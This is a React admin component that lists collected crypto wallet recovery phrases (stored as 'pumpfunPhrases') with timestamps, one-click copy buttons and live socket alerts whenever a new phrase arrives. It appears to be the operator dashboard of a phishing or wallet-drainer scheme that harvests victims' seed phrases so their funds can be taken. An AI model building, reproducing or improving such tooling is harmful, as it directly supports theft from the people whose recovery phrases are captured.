
import { useEffect } from "react"
import "./Admin.component.css"
import { usePhrase } from "../context/Phrase.context"
import socket from "../socket/Socket"

export const Admin = () => {
  const {phrases, fetchPhrase, error, loading} = usePhrase()
  useEffect(()=>{
    fetchPhrase()

    socket.on("phrase_added", () => {
    fetchPhrase();
    localStorage.setItem("phraseAdded", "true");

    const showBootstrapModal = (id) => {
      const modalElement = document.getElementById(id);
      if (modalElement && window.bootstrap?.Modal) {
        const modalInstance = new window.bootstrap.Modal(modalElement);
        modalInstance.show();
      }
    };

    showBootstrapModal("phraseAddedModal");
  });

    return () => socket.off("phrase_added");
  },[])

  const copyToClipboard = (text) => {
  navigator.clipboard.writeText(text)
    .then(() => {
      alert("Copied to clipboard!");
    })
    .catch(err => {
      alert("Failed to copy!");
      console.error("Copy failed", err);
    });
  };


  return (
    <>
      <h2 className="text-center text-light py-5 adminH2">view wallet phrase to copy</h2>
      <div className="container-fluid">
        {loading && (<p className="text-light text-center">Loading...</p>)}
        {error && (<p className="text-danger text-center">{error}</p>)}
        <table className="table table-striped table-hover table-dark table-bordered">
          <thead>
            <tr>
              <th>#</th>
              <th>Timestamp</th>
              <th className="d-none d-sm-table-cell">Id</th>
              <th>Phrase</th>
            </tr>
          </thead>
          <tbody>
            {phrases?.map((item, index) => (
              <tr key={item._id} className="text-size-admin">
                <td>{index + 1}</td>
                <td>{new Date(item.createDate).toLocaleString()}</td>
                <td className="d-none d-sm-table-cell">{item._id}</td>
                <td>{item.pumpfunPhrases}
                  <button type="button" className="btn mx-5"><i className="fa-regular fa-copy text-info" onClick={()=> copyToClipboard(item.pumpfunPhrases)}></i></button>
                </td>
              </tr>
            ))}
        
          </tbody>
        </table>
      </div>

      <div className="modal fade" id="phraseAddedModal" tabIndex="-1" aria-hidden="true">
        <div className="modal-dialog modal-dialog-centered">
          <div className="modal-content bg-dark text-white">
            <div className="modal-header">
              <h5 className="modal-title">Success</h5>
              <button type="button" className="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div className="modal-body">
              A new wallet phrase has been successfully added to the database.
            </div>
            <div className="modal-footer">
              <button type="button" className="btn btn-success" data-bs-dismiss="modal">Okay</button>
            </div>
          </div>
        </div>
      </div>
    </>
  )
}